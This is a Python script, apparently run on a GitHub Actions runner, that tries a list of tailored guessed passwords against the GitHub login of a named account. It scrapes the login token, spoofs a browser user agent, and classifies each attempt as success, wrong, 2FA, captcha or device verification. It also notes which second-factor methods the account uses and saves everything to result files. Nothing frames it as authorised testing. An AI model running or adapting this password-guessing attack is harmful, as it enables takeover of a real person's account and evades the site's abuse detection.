#!/usr/bin/env python3
# ct49: GitHub password oracle for owner account (runs inside ct49-egress GHA runner).
import json, os, re, subprocess, sys, time
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "requests"])
    import requests

LOGIN = "eazylaykzy"
CANDS = [
    "Tonic@2024", "Tonic@2023", "Tonic@2022", "TonicTech@2024",
    "Tonic@123", "Tonic2024!", "Cardtonic@2020", "Adeniji@2024",
]
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
os.makedirs("out2", exist_ok=True)


def egress():
    try:
        return requests.get("https://api.ipify.org", timeout=20).text.strip()
    except Exception as e:
        return f"ERR {e}"


res = []
consec = 0
stop_reason = ""
ipinfo = egress()
print("EGRESS_IP", ipinfo, flush=True)
for pw in CANDS:
    rec = {"login": LOGIN, "pw": pw}
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    try:
        r = s.get("https://github.com/login", timeout=30)
        m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
        if not m:
            rec["verdict"] = "NO_LOGIN_PAGE"; rec["status"] = r.status_code
        else:
            tok = m.group(1).replace("&amp;", "&")
            time.sleep(0.9)
            r2 = s.post("https://github.com/session",
                        data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                              "password": pw, "webauthn-conditional": "undefined",
                              "javascript-support": "true", "webauthn-support": "supported"},
                        allow_redirects=False, timeout=30)
            rec["status"] = r2.status_code
            rec["location"] = r2.headers.get("Location")
            t = r2.text or ""
            if r2.status_code in (301, 302, 303):
                loc = r2.headers.get("Location", "")
                if "two-factor" in loc:
                    rec["verdict"] = "2FA"
                    try:
                        r3 = s.get("https://github.com" + loc if loc.startswith("/") else loc, timeout=30)
                        low = r3.text.lower()
                        rec["twofa_signals"] = [k for k in ["authenticator app", "enter the code", "sms",
                                                           "security key", "passkey", "recovery code",
                                                           "text message", "device verification"] if k in low]
                        rec["twofa_page_url"] = r3.url
                    except Exception as e:
                        rec["twofa_err"] = str(e)[:150]
                else:
                    rec["verdict"] = "SUCCESS" if "github.com" in loc else "REDIRECT"
            else:
                low = t.lower()
                if "incorrect username or password" in low:
                    rec["verdict"] = "WRONG"
                elif ("several failed" in low or "octocaptcha" in low or
                      "perform that action at this time" in low or "captcha" in low):
                    rec["verdict"] = "CAPTCHA"
                elif "verify your device" in low or "device verification" in low:
                    rec["verdict"] = "DEVICE_VERIFY"
                else:
                    rec["verdict"] = "OTHER"
                fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
                rec["flash"] = [re.sub(r'<[^>]+>', '', x).strip()[:160] for x in fm[:3]]
    except Exception as e:
        rec["verdict"] = "ERR"; rec["err"] = f"{type(e).__name__}: {e}"[:200]
    res.append(rec)
    print(json.dumps(rec, ensure_ascii=False), flush=True)
    if rec.get("verdict") == "CAPTCHA":
        consec += 1
        if consec >= 2:
            stop_reason = "two consecutive captcha"
            break
    else:
        consec = 0
    time.sleep(1.2)

summary = {
    "egress_ip": ipinfo,
    "stop_reason": stop_reason,
    "results": [{"pw": r["pw"], "verdict": r.get("verdict"), "location": r.get("location"),
                 "twofa": r.get("twofa_signals"), "flash": r.get("flash")} for r in res],
    "untried": CANDS[len(res):],
}
json.dump(summary, open("out2/results.json", "w"), indent=1)
open("out2/summary.txt", "w").write(json.dumps(summary, indent=1))
print("SUMMARY", json.dumps(summary, ensure_ascii=False), flush=True)
